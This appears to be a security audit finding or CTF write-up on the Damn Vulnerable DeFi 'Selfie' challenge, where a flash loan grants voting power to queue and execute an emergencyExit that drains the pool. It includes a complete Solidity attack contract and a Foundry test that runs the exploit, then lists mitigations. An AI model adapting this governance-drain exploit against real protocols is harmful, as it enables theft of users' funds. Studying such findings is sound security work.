# Critical Severity Issues

## [C-1] `SelfiePool` Flash Loan Leads to Governance Attack

**Description:** The `SelfiePool` protocol allows users to take a flash loan of any amount they desire. However, an attacker can exploit this flash loan to gain governance power and queue a proposal for the `emergencyExit` function call via a signature. After a two-day interval, the attacker executes the attack and drains all the protocol’s funds.

```javascript
function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data) external nonReentrant returns (bool) {
        if (_token != address(token)) {
            revert UnsupportedCurrency();
        }
        token.transfer(address(_receiver), _amount);

        if (
            _receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) !=
            CALLBACK_SUCCESS
        ) {
            revert CallbackFailed();
        }

        if (!token.transferFrom(address(_receiver), address(this), _amount)) {
            revert RepayFailed();
        }

        return true;
}
```

**Impact:** An attacker leverages governance power to queue and execute the withdrawal of pool tokens to their own address.

**Attack Contract:**

```javascript
contract Attack is IERC3156FlashBorrower {
    SimpleGovernance simpleGovernance;
    DamnValuableVotes dvt;
    SelfiePool pool;

    uint256 public actionId;

    constructor(SimpleGovernance _simpleGovernance, DamnValuableVotes _token, SelfiePool _pool) {
        simpleGovernance = _simpleGovernance;
        dvt = _token;
        pool = _pool;
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data
    ) external returns (bytes32) {
        // Get voting power
        dvt.delegate(address(this));

        actionId = simpleGovernance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", address(this))
        );

        dvt.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function execute() external {
        simpleGovernance.executeAction(actionId);
    }

    fallback() external payable {}
}
```

**Proof of Concept:**

1. The attacker calls the function to take a flash loan.
2. The attacker leverages the flash loan to gain voting power.
3. After a two-day period, the attacker calls the `execute` function.
4. This function internally calls `emergencyExit` from the governance contract using an encoded function selector.
5. The attacker drains all the protocol’s tokens.

**Proof of Code:**

```javascript
function testAttack() public {
        vm.startPrank(address(target));
        pool.flashLoan(
            IERC3156FlashBorrower(target),
            address(dvtVotes),
            dvtVotes.balanceOf(address(pool)),
            ""
        );

        vm.warp(block.timestamp + 2 days);
        target.execute();
        vm.stopPrank();
}
```

**Recommended Mitigation:**

1. Do not allow anyone to take a flash loan exceeding the total supply of tokens.
2. Restrict calls to only specific function selectors.
3. Implement alternative governance mechanisms to prevent such attacks.
